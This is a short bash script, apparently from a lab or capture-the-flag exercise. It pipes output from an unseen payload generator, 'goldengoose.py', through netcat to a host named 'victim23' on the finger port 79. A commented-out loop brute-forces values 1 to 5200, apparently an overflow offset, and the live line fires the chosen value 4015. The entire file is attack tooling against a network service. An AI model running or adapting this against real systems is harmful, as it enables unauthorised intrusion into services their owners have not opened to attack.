#!/bin/bash
#END=5200
#for ((i=1;i<=END;i++));
#do
#   python3 goldengoose.py $i | nc victim23 79
#done

python3 goldengoose.py 4015 | nc victim23 79
